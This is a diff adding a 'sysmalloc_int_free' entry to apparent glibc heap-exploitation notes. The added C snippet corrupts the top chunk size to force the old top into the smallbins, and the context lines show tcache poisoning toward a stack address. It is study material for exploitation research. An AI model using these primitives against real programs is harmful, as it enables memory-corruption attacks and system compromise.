@@ -388,3 +388,25 @@ d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12); // d->fd = target(stack)
 malloc(0x28); //head points to target
 intptr_t *e = malloc(0x28); // stack address allocated
 ```
+## sysmalloc_int_free
+```c
+new = malloc(PROBE); // PROBE: 0x10
+top_size = new[(PROBE / SIZE_SZ) + 1]; // top_size: 0x20ce1
+
+allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
+allocated_size &= PAGE_MASK;
+allocated_size &= MALLOC_MASK;
+new = malloc(allocated_size); // allocated_size: 0xb60
+
+top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
+top_size = *top_size_ptr; // top_size: 0x20171
+
+new_top_size = top_size & PAGE_MASK;
+*top_size_ptr = new_top_size; // top_size: 0x00171 (corrupted) 
+
+old = new;
+new = malloc(CHUNK_FREED_SIZE + 0x10); // allocated in a new segment of heap, freed the old rest one and put it into smallbins
+
+old = new;
+new = malloc(FREED_SIZE); // get the freed chunk from smallbins
+```
